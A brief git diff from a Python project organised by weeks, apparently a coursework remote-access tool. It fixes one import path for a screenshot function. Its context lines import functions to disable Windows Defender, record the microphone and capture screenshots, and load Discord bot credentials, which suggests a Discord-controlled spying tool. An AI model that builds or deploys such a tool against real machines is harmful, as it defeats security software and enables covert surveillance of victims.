@@ -3,7 +3,7 @@ import dotenv
 import time
 from week_1.disable_defender import show_running_processes, disable_defender
 from week_3.mic.record_mic import record_mic, list_audio_devices
-from week_3.take_screenshot import take_screenshot
+from week_3.screenshot.take_screenshot import take_screenshot
 # laden van env variables1
 DISCORD_BOT_ID = dotenv.get_key("week_2/.env", "DISCORD_BOT_ID")
 DISCORD_SERVER_NAME = dotenv.get_key("week_2/.env", "DISCORD_SERVER_NAME")
